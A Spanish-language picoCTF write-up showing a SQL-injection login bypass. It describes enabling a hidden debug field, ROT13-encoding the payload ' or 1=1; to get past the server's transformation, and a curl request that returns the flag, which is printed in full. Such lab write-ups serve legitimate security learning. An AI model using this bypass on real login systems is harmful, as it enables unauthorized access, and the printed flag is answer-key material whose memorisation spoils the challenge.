## Objetivo
There is a secure website running at `https://jupiter.challenges.picoctf.org/problem/40742/` ([link](https://jupiter.challenges.picoctf.org/problem/40742/)) or http://jupiter.challenges.picoctf.org:40742. Try to see if you can login as admin!
## Solución 1
- Ingresamos a la pagina, nos fuimos al login e inspeccionamos la pagina.
- Nuevamente modificamos el tipo para que sea visible y cambiamos su valor por 1.
```bash
<input type="hidden" name="debug" value="0">
<input name="debug" value="1">
```
- Utilizamos las diferentes formas aprendidas para obtener la bandera, pero en este caso solo al campo que nos aparece que es el password.
```
password: ' or 1=1;
SQL query: SELECT * FROM admin where password = '' be 1=1;
```
- Descubrimos que lo que le enviamos lo transforma con el ROT13, así que utilizando CyberChef obtenemos la forma en ROT13 del `' or 1=1;` y lo que nos genere se lo copiamos como el password y ya obtenemos la bandera.
```bash
password: ' be 1=1;
SQL query: SELECT * FROM admin where password = '' or 1=1;'

# Logged in!

Your flag is: picoCTF{3v3n_m0r3_SQL_4424e7af}
```
## Solución 2
```bash
armandoPC-picoctf@webshell:~$ curl https://jupiter.challenges.picoctf.org/problem/40742/login.php -d "password=' be 1=1;&debug=1"
<pre>password: ' be 1=1;
SQL query: SELECT * FROM admin where password = '' or 1=1;'
</pre><h1>Logged in!</h1><p>Your flag is: picoCTF{3v3n_m0r3_SQL_4424e7af}</p>armandoPC-picoctf@webshell:~$ 
```
## Notas Adicionales
## Referencias
